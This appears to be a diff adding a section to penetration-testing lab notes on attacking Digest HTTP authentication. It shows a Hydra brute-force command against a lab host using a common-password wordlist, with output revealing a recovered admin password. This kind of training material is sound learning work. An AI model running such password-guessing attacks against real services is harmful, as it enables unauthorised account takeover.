@@ -467,3 +467,15 @@ Warning: way you want. Consider using -I/--head instead.
 Attaching  Basic HTTP Authentication
 
 
+Attacking  Digest HTTP Authentication
+
+
+root@attackdefense:~# hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt 192.195.70.3 http-get /digest/
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-30 14:25:49
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:1/p:100), ~7 tries per task
+[DATA] attacking http-get://192.195.70.3:80/digest/
+[80][http-get] host: 192.195.70.3   login: admin   password: adminpasswd
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-30 14:25:50
